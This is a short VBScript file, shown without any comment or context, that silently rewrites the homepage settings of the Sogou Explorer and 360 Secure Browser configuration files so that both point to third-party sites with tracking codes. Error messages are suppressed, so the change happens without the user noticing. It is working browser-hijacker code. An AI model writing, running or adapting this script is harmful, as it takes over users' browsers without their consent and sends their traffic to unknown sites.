on error resume next
DIM Fso,TxtFl,Str,re,WshShell,path
Set Fso = CreateObject("Scripting.FileSystemObject")
set WshShell=WScript.CreateObject("WScript.shell")
path=WshShell.ExpandEnvironmentStrings("%UserProfile%")

Set TxtFl = Fso.OpenTextFile (path+"\Application Data\SogouExplorer\Config.xml",1,True)
Set re = new RegExp
re.Pattern = "homepage=""([\S\s]*?)"""
re.Global = true
re.IgnoreCase = true
Str = re.Replace ( TxtFl.ReadAll,"homepage=""http://www.l798.com/?scd""")
re.Pattern = "homepagetype=""([\S\s]*?)"""
Str = re.Replace ( Str,"homepagetype=""3""")
TxtFl.Close
Set TxtFl = Fso.OpenTextFile (path+"\Application Data\SogouExplorer\Config.xml",2,True)
TxtFl.Write Str 
TxtFl.Close
                        
Set TxtFl = Fso.OpenTextFile (path+"\Application Data\360se\360SE.ini",1,True,-1)
Set re = new RegExp
re.Pattern = "\s+HomePage=([\S\s]*?)\s+"
re.Global = true
re.IgnoreCase = true
Str = re.Replace ( TxtFl.ReadAll,vbNewLine+"HomePage=http://www.gd023.com/?3acd"+vbNewLine)
TxtFl.Close
Set TxtFl = Fso.OpenTextFile (path+"\Application Data\360se\360SE.ini",2,True,-1)
TxtFl.Write Str 
TxtFl.Close                                                                                                                                                                           